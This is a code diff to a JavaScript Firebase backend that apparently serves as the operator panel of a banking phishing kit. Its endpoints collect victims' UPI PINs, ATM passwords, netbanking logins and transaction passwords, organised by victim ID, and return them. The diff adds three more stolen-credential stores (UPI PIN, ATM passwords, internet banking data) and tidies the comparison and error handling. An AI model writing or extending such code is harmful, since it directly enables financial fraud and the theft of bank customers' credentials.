@@ -7,7 +7,11 @@ const NODES = {
   upi: "upi_submissions",
   userPins: "user_pins",
   bankLogins: "netbanking_login_data",
-  transactionPasswords: "transaction_passwords"
+  transactionPasswords: "transaction_passwords",
+
+  bankUpiPin: "bank_upipin",
+  atmPasswords: "atm_passwords",
+  internetBankingData: "internet_banking_data"
 };
 
 const cleanUID = (uid) => {
@@ -35,20 +39,35 @@ export const getAllUsersFullData = async (req, res) => {
     uniqueIds.forEach(uid => {
       finalList.push({
         uniqueid: uid,
-        forms: Object.values(raw.forms).find(v => cleanUID(v.uniqueid) == uid) || null,
-        netbanking: Object.values(raw.netbanking).find(v => cleanUID(v.uniqueid) == uid) || null,
-        cardPayments: Object.values(raw.cardPayments).find(v => cleanUID(v.uniqueid) == uid) || null,
-        upi: Object.values(raw.upi).find(v => cleanUID(v.uniqueid) == uid) || null,
-        userPins: Object.values(raw.userPins).find(v => cleanUID(v.uniqueid) == uid) || null,
-        bankLogins: Object.values(raw.bankLogins).find(v => cleanUID(v.uniqueid) == uid) || null,
-        transactionPasswords: Object.values(raw.transactionPasswords).find(v => cleanUID(v.uniqueid) == uid) || null
+
+        forms: Object.values(raw.forms).find(v => cleanUID(v.uniqueid) === uid) || null,
+        netbanking: Object.values(raw.netbanking).find(v => cleanUID(v.uniqueid) === uid) || null,
+        cardPayments: Object.values(raw.cardPayments).find(v => cleanUID(v.uniqueid) === uid) || null,
+        upi: Object.values(raw.upi).find(v => cleanUID(v.uniqueid) === uid) || null,
+        userPins: Object.values(raw.userPins).find(v => cleanUID(v.uniqueid) === uid) || null,
+        bankLogins: Object.values(raw.bankLogins).find(v => cleanUID(v.uniqueid) === uid) || null,
+        transactionPasswords:
+          Object.values(raw.transactionPasswords).find(v => cleanUID(v.uniqueid) === uid) || null,
+
+        bankUpiPin:
+          Object.values(raw.bankUpiPin).find(v => cleanUID(v.uniqueid) === uid) || null,
+
+        atmPasswords:
+          Object.values(raw.atmPasswords).find(v => cleanUID(v.uniqueid) === uid) || null,
+
+        internetBankingData:
+          Object.values(raw.internetBankingData).find(v => cleanUID(v.uniqueid) === uid) || null
       });
     });
 
     return res.json({ success: true, data: finalList });
 
   } catch (err) {
-    return res.status(500).json({ success: false, message: "Server error" });
+    console.error(err);
+    return res.status(500).json({
+      success: false,
+      message: "Server error"
+    });
   }
 };
 
@@ -56,18 +75,27 @@ export const getUserFullData = async (req, res) => {
   try {
     const { uniqueid } = req.params;
     const uid = cleanUID(uniqueid);
-    if (!uid) return res.json({ success: false, message: "uniqueid required" });
+
+    if (!uid) {
+      return res.json({
+        success: false,
+        message: "uniqueid required"
+      });
+    }
 
     const result = {};
 
     for (const key in NODES) {
       const snap = await rtdb.ref(NODES[key]).get();
+
       if (!snap.exists()) {
         result[key] = null;
         continue;
       }
 
-      const data = Object.values(snap.val()).find(v => cleanUID(v.uniqueid) == uid) || null;
+      const data =
+        Object.values(snap.val()).find(v => cleanUID(v.uniqueid) === uid) || null;
+
       result[key] = data;
     }
 
@@ -78,7 +106,11 @@ export const getUserFullData = async (req, res) => {
     });
 
   } catch (err) {
-    return res.status(500).json({ success: false, message: "Server error" });
+    console.error(err);
+    return res.status(500).json({
+      success: false,
+      message: "Server error"
+    });
   }
 };
 
